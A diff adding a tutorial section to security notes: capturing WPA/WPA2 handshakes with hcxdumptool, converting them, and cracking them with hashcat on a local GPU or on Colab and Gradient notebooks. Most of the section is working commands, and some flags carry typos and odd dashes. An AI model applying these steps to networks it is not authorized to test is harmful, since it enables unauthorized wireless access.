@@ -153,9 +153,148 @@ If you capture this handshake, you can break it to reveal the password for the W
 
 {% embed url="https://www.stationx.net/how-to-use-aircrack-ng-tutorial/" %}
 
-WPA/WPA‐2 Cracking - AIRCRACK SUITE
+## Capturing Handshakes with Hcxdumptool
+
+Capturing Handshakes is the first step and most important step for cracking wifi password. Hcxdumptool provides another method to capture the handshakes and is the recommended method to capture packets by Hashcat developers which is another excellent password cracking tool.&#x20;
+
+Hcxdumptool is an easy and straightforward way to capture handshakes.
+
+* You do not need to de authenticate the clients
+* You can capture handshakes in bulk for all available networks which makes the whole process much simpler
+
+By default, the tool does not come with Kali linux and you may need to install it: `sudo apt‐get install hcxdumptool`
+
+1. Check the wifi adapters available on your machine
+
+* `iwconfig` -> Check the device name
+
+2. Stop the services that may interfare with handshake capture
+
+* `sudo systemctl stop NetworkManager`
+* `sudo systemctl stop wpa_supplicant`
+
+> After the handshake is captured you can restart the services with following command:
+>
+> `sudo systemctl start NetworkManager`
+
+3. Scan for available networks
+
+* `sudo hcxdumptool ‐i wlan0 ‐‐do_rcascan`
+
+4. Capture traffic with hcxdumptool
+
+* sudo hcxdumptool ‐i wlan0 ‐o dumpfile.pcapng –active\_beacon –enable\_status=15
+
+> dumpfile.pacapng is the file where handshake will be stored
+>
+> ‐wlan0mon is the interface name.
+
+* After a minute or two, stop the capture with Ctrl+C and you will have your captured packets file stored in your home directory
+
+{% embed url="https://miloserdov.org/?p=7801" %}
+
+{% embed url="https://github.com/ZerBea/hcxdumptool" %}
+
+## Preparing captured Handshakes for Cracking
+
+### Convert Handshakes captured through Hcxdumptool
+
+1. **Install the hcxpcapngtool**
+
+* `sudo apt‐get install hcxtools`
+
+2. **Convert the captured file with the tool**
+
+* hcxpcapngtool ‐o hash.hc22000 ‐E essidlist dumpfile.pcapng
+
+> ‐hash.hc22000 is the converted file
+>
+> Essid list will contain the list of SSIDs
+>
+> Dumpfile.pcapng is the source file
+
+3. Convert the captured file with the tool
+
+* `hcxpcapngtool ‐o hash.hc22000 ‐E essidlist dumpfile.pcapng`
+* Check the essidlist file for name of wifi networks
+* `nano essidlist`
+
+> Sometimes wifi networks leak passwords and here we can see if there is some leaked password without even cracking something
+
+* Check the BSSID of our network
+* sudo hcxdumptool ‐i wlan0 ‐‐do\_rcascan
+
+4. **Delete the excessive information and keep only the target network handshakes**
+
+* `nano hash.hc22000`
+* Now, we have our converted file hash.hc22000. Just copy it from Vmware machine to your main Windows Machine
+
+### Convert Handshakes captured through Aircrack suite
+
+1. **Copy the .cap file from VB machine to Windows machine**
+2. **Use the following official website from hashcat developers to convert the file to proper format(.hc2200)**: [https://hashcat.net/cap2hashcat/](https://hashcat.net/cap2hashcat/)
+3. **Download the converted file**
+
+## Cracking Handshakes with Hashcat
 
 
+
+{% content-ref url="../hashcat.md" %}
+[hashcat.md](../hashcat.md)
+{% endcontent-ref %}
+
+### Cracking handshakes on Windows with Powerful graphics card
+
+1. **Install the Hashcat from official website** https://hashcat.net/hashcat/
+2. **Copy the handshake file to hashcat directory**
+3. **Download and extract the rockyou dictionary in hashcat folder** https://github.com/brannondorsey/naive‐hashcat/releases/download/data/rockyou.txt
+4. **Open the Power shell and then use the command to crack the handshake**
+
+* `.\Hashcat.exe ‐m 22000 ‐a 0 ‐o cracked.txt hash.hc22000 rockyou.txt`
+
+> 22000 tells the hashcat that its wifi password to be cracked
+>
+> Cracked.txt will store cracked passwords
+>
+> Hash.hc22000 is the source file
+>
+> Rockyou.txt is the dictionary file
+
+### Cracking handshakes in cloud with Google collab
+
+Google Collab is a free service offered by google to students to train their ML models.
+
+There are a few jupyter notebooks already created by experts which can be utilized to crack the password. Do not abuse the service as its use may be restricted on abuse.
+
+1. **Open any of the following links while signed in with your Google account** (Separate account is preferred)
+
+> * https://colab.research.google.com/github/mxrch/penglab/blob/master/penglab.ip ynb
+> * https://colab.research.google.com/github/someshkar/colabcat/blob/master/colabc at.ipynb
+> * &#x20;https://colab.research.google.com/github/ShutdownRepo/google‐colab‐ hashcat/blob/main/google\_colab\_hashcat.ipynb
+
+2. **Install hashcat and required dictionaries while following instructions**
+3. **Upload your hash file to an online file hosting provider like filebin.com or catbox.moe and then import it in your notebook with the following command in a new block**
+
+* `wget http://filebin.com/filename`
+
+4. **Crack the handshake with following command**
+
+* `!hashcat ‐‐status ‐m 22000 ‐a 0 ‐o cracked.txt hash.hc22000 /content/wordlists/rockyou.txt`
+
+### Cracking handshakes in cloud with Gradient
+
+1. **Sign up for a gradient account**
+
+* https://gradient.run/
+
+2. **Copy Block by Block, the code from following repo to a new notebook**
+
+* https://colab.research.google.com/github/ShutdownRepo/google‐colab‐ hashcat/blob/main/google\_colab\_hashcat.ipynb
+
+3. **Use the same commands to crack the handshake as we used in google collab**
+
+* `wget http://filebin.com/filename`
+* `!hashcat ‐‐status ‐m 22000 ‐a 0 ‐o cracked.txt hash.hc22000 /content/wordlists/rockyou.txt`
 
 
 
